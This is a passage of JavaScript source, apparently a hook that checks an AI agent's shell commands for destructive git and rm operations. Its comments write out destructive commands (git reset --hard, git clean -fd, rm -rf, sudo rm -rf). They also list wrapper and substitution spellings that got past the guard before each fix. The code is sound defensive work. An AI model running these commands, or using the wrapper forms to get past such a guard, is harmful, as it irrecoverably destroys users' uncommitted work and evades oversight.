  // a trailing COMMENT, so `git status # x; git reset --hard` fires on a segment
  // the shell would never execute. Measured both ways: with the newline fix but
  // WITHOUT this strip, that input still reached BLOCK — the newline-aware split
  // alone does not close it, and asserting otherwise would be a comment its own
  // code could not back.
  //
  // HEREDOC BODIES ARE NOT COMMANDS, and making the split newline-aware is
  // exactly what made that bite here. Before, a `cat > f <<'EOF' … EOF` body sat
  // inside ONE segment whose leading token was `cat`, so prose was shielded by
  // accident; splitting on newlines promotes every prose LINE to a segment, and
  // a line that merely QUOTES a destructive command then parses as a real
  // invocation. Caught by this guard firing on the commit message describing
  // this very fix — the same shape the worktree lane below already documents
  // ("including a `git commit -F- <<'EOF'` commit message for this PR"). That
  // lane solved it and the solution had not reached these three; this is the
  // third such gap in this file, which is the point of #1549.
  //
  // `.structural` is the command with every heredoc BODY and close line removed.
  // On the parser's work-budget overflow it is absent, so the walk gets an empty
  // string and finds nothing — failing OPEN on an unverifiable signal, which is
  // the disposition MUST-2 requires over guessing.
  //
  // ⛔ `keepExpandableBodies` IS NOT OPTIONAL, and leaving it at the default was
  // a MEASURED hole (S1). An UNQUOTED heredoc body is EXPANDED by the shell while
  // it is being built, so a `$(…)` inside one RUNS — `cat <<EOF` followed by a
  // line `$(git reset --hard HEAD)` really does discard uncommitted work. The
  // default parser removes every body unconditionally, so this lane never saw
  // it, while `parseGitInvocations` — which goes through
  // `stripHeredocBodies`, the SAME primitive requested with
  // `keepExpandableBodies: true, keepDelimiterLine: true` — did. Two callers of
  // one heredoc parser disagreeing about what the shell executes is exactly the
  // drift `security.md` § Enforcement-Surface Parity exists to prevent, and it
  // showed up as the ONE pole in the T65 descent set that still returned rc=0
  // after the descent landed (fixture: `cat <<EOF` + `$(git -C <dirty> reset
  // --hard)` + `EOF`, against a tree the bare spelling BLOCKS).
  //
  // The false-positive class this file's heredoc handling exists to close is
  // PRESERVED, and the retention is what makes that true rather than a hope:
  // measured on the same primitive, a body with NO expansion is removed
  // (`git -C <d> reset --hard` as prose -> no invocation), a QUOTED delimiter
  // performs no expansion and is removed (`<<'EOF'` -> no invocation), and a
  // mixed line whose expansion is not the command word
  // (`update at $(date) git reset --hard`) parses to no invocation either. Only
  // a body the shell genuinely expands is kept.
  const heredocSpans =
    command.indexOf("<<") === -1
      ? { structural: command }
      : parseHeredocSpans(command, {
          keepExpandableBodies: true,
          keepDelimiterLine: true,
        });
  const rawSegments = splitShellSegments(
    stripShellComments(maskDocCarrierPayloads(heredocSpans.structural || "")),
    { newlineSeparates: true },
  );

  // NESTED SHELL BODIES ARE COMMANDS (loom#1589). A `-c` operand or an `eval`
  // body is a command string the tokenizer already isolated, so the destructive
  // verb inside it sits in a real subcommand POSITION — it is simply one level
  // down. Measured against a genuinely dirty checkout BEFORE this expansion:
  // `sh -c 'git reset --hard HEAD'`, `bash -c 'git clean -fd'`,
  // `eval "git reset --hard HEAD"` and `echo -fd | xargs git clean` each exited
  // 0 with NO finding at all, while their plain spellings BLOCK — the identical
  // wrapper-form gap measured in posture-gate's mutation fence, on the fence
  // whose loss is IRRECOVERABLE (no reflog for unstaged or untracked files).
  // Swept in the SAME change per security.md § Enforcement-Surface Parity.
  //
  // Used ONLY by the ORDER-INDEPENDENT lanes below (unresolvable-subcommand,
  // reset --hard, clean -f, push --force, --no-verify). The `cd`-trail lane keeps
  // its own quote-aware split: a nested body runs in a SUBSHELL and cannot move
  // the parent shell's cwd, so splicing it into a directory trail would model a
  // `cd` that never happens.
  // SHELL GROUPING IS NOT A DISGUISE (loom s60). `splitShellSegments` separates
  // on `&&`/`||`/`;`/`|`/newline but never on `(`/`{`, so a GROUPED command
  // stayed one segment whose leading token was `(git` — which
  // `parseGitInvocation` does not recognise, so every fence below dispatching on
  // `g.sub` saw nothing. MEASURED against a genuinely dirty checkout, on the two
  // ALREADY-SHIPPED fences whose loss is IRRECOVERABLE:
  //   git -C <dirty> reset --hard HEAD   (alone)   -> exit 2 BLOCK
  //   (git -C <dirty> reset --hard HEAD) (grouped) -> exit 0 SILENT
  //   git -C <dirty> clean -fd           (alone)   -> exit 2 BLOCK
  //   (git -C <dirty> clean -fd)         (grouped) -> exit 0 SILENT
  // The unwrapped rows are the control that proves the hook can speak about
  // that tree, so the grouped silence was a real bypass — one keystroke
  // disarming a guard over work that has no reflog. Applied to `segments` ONLY,
  // never to the `cd`-trail lane's own split: a subshell `cd` runs in a child
  // and CANNOT move the parent shell's cwd, so splicing a stripped group into a
  // directory trail would model a `cd` that never happens.
  const nestedExpansion = expandNestedSegments(rawSegments);
  const segments = nestedExpansion.segments.map(stripShellGroupDelimiters);

  // UNKNOWN SUBCOMMAND — fail CLOSED (loom#1549 F3 lock 8). A git invocation
  // whose VERB is produced by a construct the hook must not evaluate
  // (`git $(echo reset) --hard`, or a `$(a && b)` the raw splitter above cut in
  // half) could be ANY verb, including the two fenced destructive ones. Every
  // fence below dispatches on a literal `g.sub`, so an unknown verb matches
  // none of them and the segment would fall through to a silent allow — the
  // precise shape this fix exists to close.
  //
  // Disposition is copied, not invented: it is the one gitWorkingTreeStatus
  // already takes for an unresolvable git binary ("Unresolvable git ranks
  // TIGHTEST here … `ok:false` already routes the caller to halt-and-report
  // rather than silent allow"). halt-and-report, not block, per
  // hook-output-discipline.md MUST-2 — there is no structural dirty-tree
  // measurement to justify `block` when the tree cannot even be identified.
  for (const seg of segments) {
    const g = parseGitInvocation(seg);
    if (!g || g.unresolvable !== "subcommand") continue;
    // loom#1606 instance 8 — DEFER and BREAK, never return. This lane fails
    // CLOSED on an unresolvable verb, but returning here handed the whole
    // command a non-blocking exit, so the two fences whose loss is
    // IRRECOVERABLE never ran on the segments that WERE resolvable. MEASURED
    // with a control on a tree carrying untracked files:
    //   git clean -fd            (alone)  -> exit 2 BLOCK
    //   git $(echo status) && <same>      -> exit 0 ALLOW
    // `break` (not `continue`): one unresolved-verb report per command is
    // enough, and the resolvable segments still reach every fence below.
    deferredFindings.push({
      severity: "halt-and-report",
      what_happened: `Bash invoked git with a subcommand this hook cannot resolve: ${command.slice(0, 120)}`,
      why: "git.md MUST 'Destructive Working-Tree Ops' — the subcommand is produced by a shell construct (command substitution, parameter expansion) the hook MUST NOT evaluate (hook-output-discipline.md Rule 3 / security.md § no-eval). The verb is therefore UNKNOWN and may be `reset --hard` or `clean -f`, so the destructive-op fence cannot clear it. Unresolvable ranks TIGHTEST at a fail-closed fence.",
      agent_must_report: [
        "State the literal git subcommand this command resolves to at runtime",
        "Re-issue it with the subcommand written literally (`git reset …`, not `git $(…) …`) so the destructive-op fence can measure the target tree",
      ],
      agent_must_wait:
        "Do not retry with the subcommand still hidden behind a substitution. Write the verb literally.",
      user_summary:
        "git subcommand hidden behind a shell substitution — cannot be fence-checked; write it literally",
    });
    break;
  }

  // A NESTED BODY THAT COULD NOT BE READ IS NOT AN ABSENT ONE (S1 item 4).
  //
  // `expandNestedSegments` reports TWO flags alongside its segment list —
  // `unresolvable` (a body EXISTS but its content cannot be known, e.g.
  // `sh -c "$CMD"`, `eval "$(cat f)"`) and `truncated` (the cost cap stopped
  // the walk) — and this lane kept only `.segments`, DISCARDING both. The
  // expansion is therefore asymmetric in the one direction a fence cannot
  // afford: it descends into every body it CAN read and reports nothing about
  // the ones it cannot, so "I looked and found no destructive verb" and "I could
  // not look" arrive here identically. That is the
  // `evidence-first-claims.md` MUST-3 shape, at the input to every fence below.
  //
  // WHY IT MATTERS HERE SPECIFICALLY. The segments handed on from this point
  // are parsed for a git/gh verb in the command position. A body behind `$CMD`
  // has no command position this file can read, so NO fence below can speak
  // about it — and the guard's own convention (`parseGitInvocations` appending
  // a `"subcommand"`-marked record for exactly this case) is that unreadable
  // content ranks TIGHTEST rather than clean. Consuming the flags makes that
  // convention hold on the segment path too, instead of being enforced on one
  // entry point and dropped on the other (`security.md` § Enforcement-Surface
  // Parity).
  //
  // `halt-and-report`, NOT `block`, and deferred rather than returned, both by
  // the same reasoning the lane above states: there is no structural
  // dirty-tree measurement behind an unreadable body, so block would be a
  // lexical severity (`hook-output-discipline.md` MUST-2), and a `return` here
  // would suppress the `block` fences for the segments that WERE resolvable —
  // the loom#1606 instance-8 lesson.
  if (nestedExpansion.unresolvable || nestedExpansion.truncated) {
    deferredFindings.push({
      severity: "halt-and-report",
      what_happened:
        "Bash ran a nested command body this hook could not read: " +
        command.slice(0, 120),
      why:
        "The command carries a nested shell body (`sh -c \"$CMD\"`, `eval \"$(cat f)\"`) whose TEXT is produced by a construct the hook MUST NOT evaluate (hook-output-discipline.md Rule 3 / security.md § no-eval), or the nesting walked past its cost cap. Every destructive-op fence in this file dispatches on a parsed subcommand POSITION, and a body that cannot be read has none — so the fences below are UNANSWERED for it rather than satisfied. An unreadable body ranks TIGHTEST here, matching the fail-closed lane above and `parseGitInvocations`'s own `\"subcommand\"` record for the same case.",
      agent_must_report: [
        "State the literal text of the nested body this command will run",
        "Re-issue it with the body written literally so the fences can measure what it does",
      ],
      agent_must_wait:
        "Do not retry with the body still opaque. Write the nested command literally.",
      user_summary:
        "a nested command body could not be read — the destructive-op fences are unanswered for it",
    });
  }

  // DESTRUCTIVE FORCE-REMOVAL OF A WHOLE TREE (loom s60, Orchestration
  // Integrity component 4). Two verbs, one hazard, one predicate:
  //
  //   git worktree remove --force <path>
  //   rm -rf <path>
  //
  // `worktree-isolation.md` Rule 8 makes the first BLOCKED, and states WHY in
  // the only terms that matter: a BARE `git worktree remove` REFUSES a dirty
  // tree, and that refusal IS the safety mechanism. `--force` exists precisely
  // to defeat it. `git.md` § "Destructive Working-Tree Ops" names `rm -rf` of
  // untracked paths in the same breath as `reset --hard` and `clean -f`. There
  // is no reflog for an unstaged modification and none for an untracked-not-
  // ignored file, so what these remove is GONE.
  //
  // MEASURED SILENT before this lane existed, driving the shipped hook against a
  // synthetic sandbox carrying one modified tracked file and one untracked file
  // (`git reset --hard` / `git clean -fd` on the SAME tree exited 2 BLOCK — the
  // positive control proving the hook could speak about it, so the silence was
  // a real gap and not an inert instrument, instrument-discipline.md MUST-3(a)):
  //
  //   git worktree remove --force <dirty>              -> exit 0 SILENT
  //   git worktree remove -f <dirty>                   -> exit 0 SILENT
  //   git worktree remove -fq <dirty>                  -> exit 0 SILENT
  //   git worktree remove <dirty> --force              -> exit 0 SILENT
  //   git status && git worktree remove --force <d>    -> exit 0 SILENT
  //   bash -c "git worktree remove --force <dirty>"    -> exit 0 SILENT
  //   rm -rf <dirty>                                   -> exit 0 SILENT
  //   sudo rm -rf <dirty>                              -> exit 0 SILENT
  //
  // Only the LONG-flag `rm --recursive --force` spelling was fenced (by the
  // dangerous-pattern list above), so the SHORT form every operator actually
  // types went straight through — a guard matching one spelling of a flag is
  // disarmed by writing the other.
  //
  // SEVERITY IS `halt-and-report`, NOT `block`, and that is deliberate. Whether
  // a specific tree SHOULD be force-removed is the operator's judgment — this
  // fence exists to make the cost visible before the keystroke, not to refuse
  // work the agent was instructed to perform (`hook-output-discipline.md`
  // MUST NOT). It differs from the `clean -f` fence above, which blocks: there,
  // the untracked files are enumerable and the operation is unconditionally
  // lossy; here the operator may be removing a tree they deliberately finished
  // with. The finding NAMES THE RESOLVED TARGET PATH and lists what would be
  // destroyed, so the halt is actionable rather than merely obstructive.
  //
  // DEFERRED, NEVER RETURNED (the loom#1606 lesson, instances 4-8). A
  // `halt-and-report` return here would suppress every `block` fence — the two
  // irrecoverable git fences among them — for a command like
  // `rm -rf <dir> && git reset --hard`. `withDeferred` takes the MAX severity,
  // so a `block` below still wins and this finding still rides out.
  //
  // AND IT MUST SIT ABOVE THEM, which is the other half of that lesson and is
  // easy to get wrong: deferring is necessary but NOT sufficient. This lane was
  // first placed AFTER the `reset --hard` and `clean -f` fences, and because
  // those RETURN, the command
  //   rm -rf <dirty> && git -C <dirty> reset --hard HEAD
  // returned at the reset fence before this lane ever ran — the block was
  // correct, but the operator was never told the `rm -rf` would take the tree
  // too. Caught by this lane's own fixture (`DEFER/block-below-still-wins-and-
  // finding-rides-out`), not by review. A deferral-only lane is safe to place
  // early precisely BECAUSE it never returns, so it is placed early.
  //
  // IT ASSESSES THE COMMAND'S TARGET, NEVER `HEAD` AND NEVER THE CWD. The
  // existing `gitWorkingTreeStatus(g.dir, cwd)` is correct for `reset --hard` /
  // `clean -f`, which DO act on `g.dir`; reusing it here would be exactly the
  // defect this component exists to close — a prior instance swept `HEAD` while
  // the command named another target and returned 18 bytes of silence while 11
  // unlanded artifacts were destroyed. `assessTarget` therefore takes the
  // resolved OPERAND and nothing else.
  //
  // RELATIVE-OPERAND BASE, and its stated residual: `git -C <dir> worktree
  // remove ../wt` chdirs to `<dir>` FIRST, so a relative operand resolves
  // against it, not against the session cwd. `g.dir` is the parser's EFFECTIVE
  // work-tree, in which `--work-tree` outranks `-C`; for `worktree remove` only
  // `-C` actually moves the process, so a `--work-tree`-only invocation with a
  // RELATIVE operand would be resolved against the wrong base. That form does
  // not chdir and is vanishingly rare, and the residual is recorded here rather
  // than papered over — an absolute operand is unaffected either way.
  for (const seg of segments) {
    const findings = [];

    const g = parseGitInvocation(seg);
    const wt = selectWorktreeRemoveForce(g);
    if (wt && wt.force) {
      findings.push({ kind: "worktree", token: wt.target, gdir: g && g.dir });
    }
    const rmSel = selectRmForce(seg);
    if (rmSel) {
      if (rmSel.unresolvable) {
        findings.push({ kind: "rm", token: null, gdir: null });
      }
      for (const t of rmSel.targets) {
        findings.push({ kind: "rm", token: t, gdir: null });
      }
    }
    if (findings.length === 0) continue;

    for (const f of findings) {
      const verb =
        f.kind === "worktree" ? "git worktree remove --force" : "rm -rf";
      const base = f.gdir ? path.resolve(cwd || ".", f.gdir) : cwd || ".";
      const abs = f.token === null ? null : resolveTargetPath(f.token, base);
      const a = assessTarget(abs);
      const where = a.path || (f.token === null ? "<unresolved>" : f.token);

      // FAIL OPEN, LOUDLY. "I could not look" and "I looked and it was empty"
      // are opposite meanings with identical-looking output
      // (evidence-first-claims.md MUST-3), so an unassessable target is
      // REPORTED as indeterminate and never allowed to read as clean.
      if (a.state === FORCE_STATE.INDETERMINATE) {
        deferredFindings.push({
          severity: "halt-and-report",
          what_happened: `Bash invoked \`${verb}\` against a target this hook could NOT assess: ${where}`,
          why: `worktree-isolation.md Rule 8 / git.md § "Destructive Working-Tree Ops" — a bare \`git worktree remove\` REFUSES a dirty tree and that refusal IS the safety mechanism \`--force\` defeats; unstaged modifications and untracked-not-ignored files have NO reflog. The target could not be assessed (${a.detail}), so what would be destroyed is UNKNOWN. An unverifiable target ranks TIGHTEST at a fail-closed destructive-op fence, and INDETERMINATE is reported as such rather than as clean.`,
          agent_must_report: [
            `Name the directory this resolves to, and show \`git -C <that path> status --porcelain --untracked-files=all\` for it`,
            "Re-issue with the path written literally (no substitution) so the fence can enumerate what would be destroyed",
          ],
          agent_must_wait:
            "Do not retry the force-removal while the target tree is unidentifiable. Resolve the path and inspect it first.",
          user_summary: `${verb} at an unassessable target — what would be destroyed is UNKNOWN`,
        });
        continue;
      }

      // PATH DANGER — the SECOND, independent dimension (loom s67).
      //
      // `assessTarget` answers "what unlanded GIT WORK is here?". It does NOT
      // answer "is destroying this safe?", and reading it as though it did is
      // the `instrument-discipline.md` MUST-4 error this fence itself shipped:
      // `/`, `/usr`, `$HOME` and the orchestration root all assess CLEAN,
      // because catastrophic targets are exactly the ones with no git repo in
      // them. The two dimensions are combined at MAX severity, never gated one
      // behind the other — a CRITICAL path must speak even when git is silent,
      // which is the whole defect.
      const danger = classifyPathDanger(abs, { cwd });

      if (danger.tier === FORCE_DANGER.CRITICAL) {
        deferredFindings.push({
          severity: "block",
          what_happened: `Bash invoked \`${verb}\` against ${where} — a CATASTROPHIC target: ${danger.reason}.`,
          why: `git.md § "Destructive Working-Tree Ops" — this fence's git-content probe reports CLEAN for such a path, because a path with no repository in it has no unlanded work in it. That CLEAN is a real answer to a DIFFERENT question ("what git work is here?") and says nothing about whether destroying the path is safe; reading one for the other is \`instrument-discipline.md\` MUST-4. Structural signal — realpath-resolved ancestry against the session cwd, \`os.homedir()\` and \`os.tmpdir()\`, never a lexical match on the command text.`,
          agent_must_report: [
            `The resolved target is ${where} — state what you intended to delete and how the two differ`,
            "If you meant a subdirectory, name it in full and re-issue against THAT path",
          ],
          agent_must_wait:
            "This is not an advisory. Do not re-issue any form of this command against this target; re-issue against the specific subdirectory you meant.",
          user_summary: `${verb} on ${where} — ${danger.reason}`,
        });
        continue;
      }

      if (
        danger.tier === FORCE_DANGER.ELEVATED &&
        a.state !== FORCE_STATE.DIRTY
      ) {
        deferredFindings.push({
          severity: "halt-and-report",
          what_happened: `Bash invoked \`${verb}\` against ${where}, which is outside anything this session owns: ${danger.reason}.`,
          why: `git.md § "Destructive Working-Tree Ops" — the git-content probe is CLEAN here, but that answers "what unlanded git work is at this path?", not "is destroying it safe?". Outside the session's working tree and outside every scratch root, this fence cannot establish that the tree is the session's to destroy, and an unestablished destructive target ranks TIGHTEST at a fail-closed fence.`,
          agent_must_report: [
            `The resolved target is ${where} — say whose it is and why this session is deleting it`,
            "If it is scratch you created, prefer a path under the session scratchpad or `mktemp -d`, which are recognised",
          ],
          agent_must_wait:
            "Do not destroy a tree outside this session's working area without confirming with the user that it is yours to destroy.",
          user_summary: `${verb} on ${where} — outside this session's working tree and every scratch root`,
        });
        continue;
      }

      // EMPTY / CLEAN / non-repo AT AN ORDINARY PATH — nothing unlanded is at
      // stake and the path is one this session may legitimately destroy.
      // Silence here is CORRECT, not a gap: a fence that trips on removing a
      // finished, fully committed tree, or a `mktemp -d` scratch directory, is
      // noise, and noise is how a guard gets switched off.
      if (a.state !== FORCE_STATE.DIRTY) continue;

      const shown = a.items.slice(0, 12);
      const more =
        a.items.length > shown.length
          ? ` (+${a.items.length - shown.length} more)`
          : "";
      // The assessor now reports TWO kinds of at-risk content — uncommitted
      // paths, and commits that exist on no remote — so the message MUST come
      // from the assessor's own `detail` rather than assert the uncommitted
      // wording for both. Reporting an unpushed COMMIT as an "uncommitted or
      // untracked path" names the wrong hazard and points the operator at the
      // wrong remedy (`git diff > wip.patch` captures nothing from a clean
      // tree). Older assessors carry no `detail`; they keep the original
      // wording verbatim.
      const carries = a.detail
        ? a.detail
        : `carries ${a.items.length} uncommitted or untracked path(s) that would be destroyed with NO reflog`;
      deferredFindings.push({
        severity: "halt-and-report",
        what_happened: `Bash invoked \`${verb}\` against ${where}, which ${carries}:\n  ${shown.join("\n  ")}${more}`,
        why: `worktree-isolation.md Rule 8 / git.md § "Destructive Working-Tree Ops" — a bare \`git worktree remove\` REFUSES a dirty tree, and that refusal IS the safety mechanism; \`--force\` exists to defeat it, and \`rm -rf\` bypasses it entirely. Unstaged modifications and untracked-not-ignored files have no git object and no reflog, so the loss is IRRECOVERABLE (the #401 data-loss class). Structural signal — the target tree's own \`git status --porcelain\`, read at the COMMAND'S TARGET and not at HEAD or the session cwd.`,
        agent_must_report: [
          `The target is ${where} — quote the listed paths and say which are yours from THIS session`,
          "Capture anything unlanded to a patch first (`git -C <target> add -N . && git -C <target> diff > wip.patch`), NOT to the stash — the stash stack is shared with every linked worktree (worktree-isolation.md Rule 9)",
          "If the removal is genuinely intended, confirm the user authorized destroying THIS tree IN THIS CONVERSATION",
        ],
        agent_must_wait:
          "Do not force-remove the tree while it carries unlanded work. Capture to a patch, or land it, first.",
        user_summary: `${verb} on ${where} — ${a.items.length} unlanded path(s) would be destroyed irrecoverably`,
      });
    }
  }

  // git reset --hard — STRUCTURAL severity (hook-output-discipline.md MUST-2:
  // `git status --porcelain` non-empty is the canonical structural signal that
  // justifies `block`). BLOCK only when the resolved working tree is DIRTY (a
  // dirty-tree --hard silently discards unstaged mods + untracked files with no
  // reflog); a clean-tree --hard is safe and is ALLOWED (removes the prior
  // lexical-block false-positive). Anchor tolerates `git -C <dir>`/sudo/env
  // (HIGH-1 — the cross-tree form the #401 incident used). git-unverifiable →
  // fail-open to halt-and-report (do not hard-block on an unconfirmable signal).
  for (const seg of segments) {
    const g = parseGitInvocation(seg);
    if (!g || g.sub !== "reset" || !/(^|\s)--hard\b/.test(g.args)) continue;
    // UNRESOLVABLE TARGET TREE — fail CLOSED (loom#1549 F3 lock 8). The verb is
    // known and destructive, but `-C`/`--work-tree` names a directory only the
    // shell can produce. The porcelain probe below would spawn against the
    // LITERAL `$(…)` bytes, which name no directory: `ok:false`, and the
    // fail-OPEN contract then degrades this branch to a bare advisory. Halting
    // here makes that outcome DELIBERATE rather than an artefact of a spawn
    // that happened to fail — and it holds even if such a path ever resolved.
    if (g.unresolvable === "dir") {
      return withDeferred({
        severity: "halt-and-report",
        what_happened: `Bash invoked \`git reset --hard\` against a target directory this hook cannot resolve: ${command.slice(0, 120)}`,
        why: "git.md MUST 'Destructive Working-Tree Ops MUST Verify Clean Working Tree' — the `-C`/`--work-tree` value comes from a shell construct the hook MUST NOT evaluate (hook-output-discipline.md Rule 3 / security.md § no-eval), so the tree `--hard` would discard cannot be measured. An unverifiable target ranks TIGHTEST at a fail-closed destructive-op fence.",
        agent_must_report: [
          "Name the directory the substitution resolves to, and show `git status --porcelain` for THAT directory",
          "Re-issue with the path written literally so the fence can measure the tree, OR use `git reset --keep <ref>` (aborts on a dirty tree by itself)",
        ],
        agent_must_wait:
          "Do not retry --hard while the target tree is unidentifiable. Write the path literally, or use --keep.",
        user_summary:
          "git reset --hard at a substituted -C path — target tree unverifiable (write the path literally or use --keep)",
      });
    }
    const st = gitWorkingTreeStatus(g.dir, cwd);
    if (st.ok && st.dirty) {
      return withDeferred({
        severity: "block",
        what_happened: `Bash invoked \`git reset --hard\` against a DIRTY working tree: ${command.slice(0, 120)}`,
        why: "git.md MUST 'Destructive Working-Tree Ops MUST Verify Clean Working Tree' — a dirty-tree --hard discards unstaged modifications AND untracked files with no reflog. Structural signal (`git status --porcelain` non-empty), per hook-output-discipline.md MUST-2.",
        agent_must_report: [
          "The working tree is DIRTY — `git reset --hard` would discard the listed changes unrecoverably",
          "Use `git reset --keep <ref>` (aborts on a dirty tree) OR commit the changes first; to park them, capture to a patch (`git diff > wip.patch`), NOT to the stash — the stash stack is shared with every linked worktree (worktree-isolation.md Rule 9)",
          "If the loss is genuinely intended, confirm the user authorized it IN THIS CONVERSATION",
        ],
        agent_must_wait:
          "Do not retry --hard while the tree is dirty. Use --keep, or commit/patch first.",
        user_summary:
          "git reset --hard blocked — DIRTY working tree (use --keep, or commit/patch first)",
      });
    }
    return withDeferred({
      severity: "halt-and-report",
      what_happened: `Bash invoked \`git reset --hard\`: ${command.slice(0, 120)}`,
      why: "git.md MUST 'Destructive Working-Tree Ops' — prefer `git reset --keep` (aborts on a dirty tree). Tree appears clean or is unverifiable; surfacing per hook-output-discipline.md MUST-2 (no structural dirty-tree signal → not block).",
      agent_must_report: [
        "Confirm `git status --porcelain` is empty before --hard, OR use `git reset --keep <ref>`",
        "Explain why --hard was chosen over --keep",
      ],
      agent_must_wait:
        "Prefer --keep; proceed with --hard only after confirming the tree is clean.",
      user_summary: "git reset --hard — verify clean tree or use --keep",
    });
  }

  // git clean -f[d] — STRUCTURAL severity. `git clean -f` deletes UNTRACKED-not-
  // ignored files irreversibly (#401 data-loss class — no git object, no
  // reflog). BLOCK only when the resolved tree HAS untracked-not-ignored files
  // (porcelain `??`) that a force-clean would delete; clean-of-nothing →
  // halt-and-report (surface, allow). `-n`/`--dry-run` exempt. Anchor tolerates
  // `git -C <dir>`/sudo/env (HIGH-1). The sync-tier-aware pre-write snapshot
  // covers the tool's own fs purge; this is the cross-tool tripwire for an
  // OPERATOR-typed destructive clean.
  for (const seg of segments) {
    const g = parseGitInvocation(seg);
    if (!g || g.sub !== "clean") continue;
    const a = g.args;
    // -n / --dry-run overrides force in git and only previews — exempt.
    if (/(^|\s)-[a-zA-Z]*n[a-zA-Z]*\b/.test(a) || /(^|\s)--dry-run\b/.test(a)) {
      continue;
    }
    const force =
      /(^|\s)-[a-zA-Z]*f[a-zA-Z]*\b/.test(a) || /(^|\s)--force\b/.test(a);
    if (!force) continue; // `git clean` without -f is a no-op
    // UNRESOLVABLE TARGET TREE — fail CLOSED, same disposition as the
    // `reset --hard` fence above (loom#1549 F3 lock 8). Sibling surface, swept
    // in the SAME change per security.md § Enforcement-Surface Parity: fixing
    // only the reset lane would leave `git -C $(…) clean -fd` reaching no
    // guard, which is the identical measured bypass.
    if (g.unresolvable === "dir") {
      return withDeferred({
        severity: "halt-and-report",
        what_happened: `Bash invoked \`git clean\` with force against a target directory this hook cannot resolve: ${command.slice(0, 120)}`,
        why: "git.md MUST 'Destructive Working-Tree Ops' — the `-C`/`--work-tree` value comes from a shell construct the hook MUST NOT evaluate (hook-output-discipline.md Rule 3 / security.md § no-eval), so the untracked files `clean -f` would delete cannot be enumerated. An unverifiable target ranks TIGHTEST at a fail-closed destructive-op fence.",
        agent_must_report: [
          "Name the directory the substitution resolves to, and show `git clean -n` (dry-run) for THAT directory",
          "Re-issue with the path written literally so the fence can enumerate what would be deleted",
        ],
        agent_must_wait:
          "Do not retry the force-clean while the target tree is unidentifiable. Dry-run against the literal path first.",
        user_summary:
          "git clean -f at a substituted -C path — target tree unverifiable (write the path literally and dry-run first)",
      });
    }
    const st = gitWorkingTreeStatus(g.dir, cwd);
    if (st.ok && st.untracked) {
      return withDeferred({
        severity: "block",
        what_happened: `Bash invoked \`git clean\` with force against a tree that HAS untracked files: ${command.slice(0, 120)}`,
        why: "git.md MUST 'Destructive Working-Tree Ops' — `git clean -f[d]` deletes untracked-not-ignored files irreversibly (no git object, no reflog; the #401 data-loss class). Structural signal (`git status --porcelain` shows `??` entries), per hook-output-discipline.md MUST-2.",
        agent_must_report: [
          "Untracked-not-ignored files EXIST — `git clean -f` would delete them unrecoverably",
          "Run `git clean -n` (dry-run) to see exactly what would be deleted; to preserve it use `git add -N . && git diff > wip.patch`, NOT `git stash -u` — the stash stack is shared with every linked worktree (worktree-isolation.md Rule 9)",
          "If the deletion is genuinely intended, confirm the user authorized it IN THIS CONVERSATION",
        ],
        agent_must_wait:
          "Do not retry the clean while untracked work exists. Dry-run + capture to a patch first.",
        user_summary:
          "git clean -f blocked — untracked files present, would be deleted irreversibly",
      });
    }
    return withDeferred({
      severity: "halt-and-report",
      what_happened: `Bash invoked \`git clean\` with force: ${command.slice(0, 120)}`,
      why: "git.md MUST 'Destructive Working-Tree Ops' — `git clean -f[d]` deletes untracked-not-ignored files. No untracked-not-ignored files detected (or unverifiable); surfacing per hook-output-discipline.md MUST-2.",
      agent_must_report: [
        "Confirm via `git clean -n` (dry-run) that nothing of value would be deleted",
        "When in doubt, capture first (`git add -N . && git diff > wip.patch`) rather than destroying — and rather than stashing, which parks the work on a stack every linked worktree can pop (worktree-isolation.md Rule 9)",
      ],
      agent_must_wait:
        "Dry-run first if there is any chance of untracked work.",
      user_summary:
        "git clean -f — verify with dry-run (no untracked detected)",
    });
  }

  // SHARED-STASH COLLISION (worktree-isolation.md Rule 9 — the Phase-2 tripwire
  // its Wiring booked). The stash stack is `refs/stash` plus a reflog in the
  // COMMON `.git` dir, so it is SHARED by the main checkout and every linked
  // worktree — unlike the index and `HEAD`, which are per-worktree. A sibling's
  // `git stash pop` applies YOUR entry into ITS tree and drops it: you get a
  // merely-clean tree, the sibling gets a mutation neither authored, and BOTH
  // sides fail silently. Nothing errors, so nothing surfaces at review either.
  //
  // SEVERITY IS `pre-action`, and that is the ADVISORY class Rule 9's Wiring
  // specifies — not a strengthening of it. The `git stash` invocation IS
  // structurally visible here, but whether the repo carries linked worktrees is
  // a SECOND lookup the matcher does not itself perform, so the lexical signal
  // alone MUST NOT carry `block` (hook-output-discipline.md MUST-2). Of the two
  // non-block registers `instruct-and-wait.js` offers, `advisory` renders the
  // head "the action PROCEEDED" and `halt-and-report` renders "the action
  // ALREADY RAN" — both FALSE at PreToolUse, which is precisely the
  // mis-registration loom#1715 H-1 measured and added `pre-action` to fix. So
  // `pre-action` is the register that states an advisory PreToolUse fate
  // truthfully; the enforcement class is unchanged (non-blocking, exit 0).
  //
  // DEFERRED, never returned (the loom#1606 lesson). A `return` here would
  // suppress every fence below — including the `--no-verify` lane — for a
  // command like `git stash && git commit --no-verify`.
  //
  // SILENT ON READS. `git stash list` / `git stash show` inspect the stack and
  // write nothing; a guard that trips on INSPECTING is noise, and noise is how a
  // guard gets switched off. The mutating/read-only split is enumerated once, in
  // lib/stash-collision.js, so the hook holds no second lineage of it.
  // The `-C $(…)` case is SKIPPED by the selector, not failed closed. Unlike the
  // `reset --hard` and `clean -f` fences above — `block`-class fences over an
  // IRRECOVERABLE loss, where an unmeasurable target justifies halting by itself
  // — this finding's whole claim is "this repo has linked worktrees", and
  // asserting it unmeasured is the non-discriminating-instrument failure
  // (instrument-discipline.md MUST-1). Stated as a limitation, not papered over.
  //
  // The selector is fed the SAME expanded segments every fence above uses, and
  // it is the SAME function the fixture runner exercises — one lineage, so a
  // green fixture is a statement about the shipped guard rather than about a
  // parallel copy of it.
  const stashHazard = selectStashHazard(
    segments.map((s) => parseGitInvocation(s)),
  );
  // NOT MEASURED ⇒ SILENT (cc-artifacts.md Rule 7 fail-open). `trees.ok` is
  // false when git could not be resolved, the spawn timed out, or the porcelain
  // shape was unparseable — none of which is evidence about the worktree count.
  const stashTrees = stashHazard
    ? countWorkingTrees(stashHazard.dir, cwd)
    : { ok: false, count: 0 };
  if (stashHazard && stashTrees.ok && stashTrees.count > 1) {
    // Stack depth is CONTEXT, never part of the predicate: an empty stack is not
    // safety, because a `push` onto it creates the very entry a sibling can pop
    // a minute later. Probed only once the finding is already firing, so the
    // common (single-tree) path costs exactly one spawn.
    const stack = countStashEntries(stashHazard.dir, cwd);
    const depthNote = stack.ok
